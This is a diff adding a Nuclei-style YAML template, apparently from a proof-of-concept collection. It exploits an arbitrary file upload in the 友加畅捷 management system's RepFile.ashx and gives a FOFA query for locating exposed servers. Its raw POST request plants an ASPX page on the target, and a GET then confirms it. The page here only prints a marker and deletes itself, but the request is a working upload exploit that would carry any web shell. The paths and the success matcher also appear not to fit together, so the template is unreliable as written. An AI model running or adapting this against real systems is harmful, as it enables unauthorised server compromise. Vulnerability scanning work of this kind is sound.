@@ -1,0 +1,34 @@
+id: youjia-changjie-repfile-file-upload
+
+info:
+  name: "友加畅捷管理系统 RepFile.ashx 组件任意文件上传"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="2049187099"
+  tags: 友加畅捷
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /ReportDesign/RepFile.ashx?RepFile=pages/NTest.aspx&Type=SaveRepFileData HTTP/1.1
+    Host: {{Hostname}}
+    SOAPAction: 
+    Content-Type: application/x-www-form-urlencoded
+
+    <%@ Page Language="C#"%><% Response.Write("NdayTest"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+- raw:
+  - |
+    GET /Report/Pages/NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
